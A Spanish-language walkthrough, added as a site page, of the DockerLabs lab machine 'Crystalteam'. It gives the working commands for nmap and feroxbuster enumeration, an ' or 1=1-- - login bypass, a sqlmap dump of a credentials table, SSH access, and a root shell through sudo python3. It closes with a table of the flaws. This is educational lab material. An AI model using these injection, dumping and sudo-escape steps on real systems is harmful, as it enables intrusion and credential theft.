@@ -1,0 +1,196 @@
+---
+title: Crystalteam
+description: Resolución completa de la máquina virtual *Crystalteam* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Crystalteam**, desarrollada por *Alejandro609x* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un formulario de autenticación vulnerable a **SQL Injection**, permitiendo el bypass del login y la extracción de credenciales en texto plano de la base de datos. Con estas credenciales, se accede al sistema vía SSH como el usuario `alejandro`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `python3` como root sin autenticación, facilitando una escalada de privilegios directa hasta obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Crystalteam',
+    Autor: 'Alejandro609x',
+    Dificultad: 'Media',
+    Fecha: '22/04/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Crystalteam.zip
+sudo bash auto_deploy.sh Crystalteam.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Crystalteam/{content,exploits,nmap,scripts}
+cd Crystalteam
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1770244660/Ports_e7fjrz.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+Se identifica el endpoint **Certification**:
+
+![Certification](https://res.cloudinary.com/dewqswzke/image/upload/v1770244659/Certification_asy1ot.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 SQL Injection
+
+Se encuentra un formulario de autenticación:
+
+![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1770244660/Login_mzsnjw.png)
+
+Se prueba un bypass clásico:
+
+```
+' or 1=1-- -
+```
+
+El payload funciona. Se automatiza la explotación con `sqlmap`:
+
+```bash
+sqlmap -u http://172.17.0.2/Certificacion/login.php --form --batch --dbs
+```
+
+![Databases](https://res.cloudinary.com/dewqswzke/image/upload/v1770244659/Databases_axqtjb.png)
+
+### 2.2 Extracción de credenciales
+
+Se extrae la tabla `personales`:
+
+```bash
+sqlmap -u http://172.17.0.2/Certificacion/login.php --form --batch -D inicio -T personales --dump
+```
+
+![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1770244662/Users_nqwitx.png)
+
+### 2.3 Acceso SSH
+
+Se prueba el primer conjunto de credenciales:
+
+```bash
+ssh alejandro@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1770244661/SSH_uw0tsd.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De alejandro → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1770244662/Sudo-l_hq4kje.png)
+
+Se puede ejecutar `python3` como root:
+
+```bash
+sudo python3 -c 'import os; os.system("/bin/bash")'
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1770244660/Root_s4keu0.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de autenticación",
+      severity: "Crítica",
+      impact: "Bypass de autenticación y extracción de credenciales"
+    },
+    {
+      vulnerability: "Almacenamiento de credenciales en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso de acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Reutilización de credenciales entre servicios",
+      severity: "Alta",
+      impact: "Acceso remoto al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en python3",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
